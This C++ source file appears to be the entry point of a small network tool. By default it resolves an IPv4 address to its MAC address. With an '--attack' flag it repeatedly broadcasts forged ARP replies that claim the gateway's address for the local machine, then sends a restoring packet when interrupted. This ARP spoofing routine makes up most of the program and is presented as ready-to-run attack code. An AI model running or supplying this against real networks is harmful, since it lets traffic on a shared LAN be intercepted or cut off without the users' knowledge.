#include "utils/args.h"
#include "driver.h"
#include <signal.h>

std::atomic<bool> end_attack = false;

void onInterrupt(int) { end_attack = true; }

int main(int argc, char** argv)
{
    MY_TRY;
    namespace po = boost::program_options;
    boost::program_options::options_description opt_args("Optional arguments");
    auto opts = opt_args.add_options();
    opts("ip4", po::value<std::string>()->default_value("0.0.0.0"), "ip4 address");
    opts("attack,a", po::bool_switch(), "mobilize arp attack");
    opts("help,h", po::bool_switch(), "shows help message and exits");

    po::positional_options_description pos_args;
    pos_args.add("ip4", 1);

    po::variables_map vm;
    po::command_line_parser parser(argc, argv);
    po::store(parser.options(opt_args).positional(pos_args).run(), vm);

    if (vm["help"].as<bool>()) {
        utils::printUsage(argv[0], &opt_args, &pos_args);
        return 1;
    }

    utils::initLogger(argv[0]);
    auto ip = net::Ip4::fromDottedDec(vm["ip4"].as<std::string>());
    ILOG("ip4: {}", ip.toStr());
    net::Driver driver(ip);
    if (!vm["attack"].as<bool>()) {
        auto mac = driver.getMac(ip);
        if (!mac) {
            if (mac.error().timeout()) {
                ILOG("{} is offline", ip.toStr());
            } else {
                ELOG(mac.error().what());
            }
        } else {
            ILOG("{} is at {}", ip.toStr(), (*mac).toStr());
        }

    } else {
        signal(SIGINT, onInterrupt);
        auto& apt = driver.getAdaptor();
        if (auto gateway_mac = driver.getMac(apt.gateway)) {
            ILOG("gateway {} is at {}", apt.gateway.toStr(), gateway_mac->toStr());
        } else {
            ELOG(gateway_mac.error().what());
            return 1;
        }
        ILOG("pretending gateway's mac to {}...", apt.mac.toStr());
        auto lie = driver.broadcastedARP(apt.mac, apt.gateway, apt.mac, apt.ip, true);
        while (!end_attack) {
            driver.send(lie);
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        ILOG("attack stopped");
        if (auto gateway_mac = driver.getMac(apt.gateway)) {
            auto truth = driver.broadcastedARP(*gateway_mac, apt.gateway, apt.mac, apt.ip, true);
            driver.send(truth);
            ILOG("gateway's mac restored to {}", gateway_mac->toStr());
        }
    }
    MY_CATCH;
}
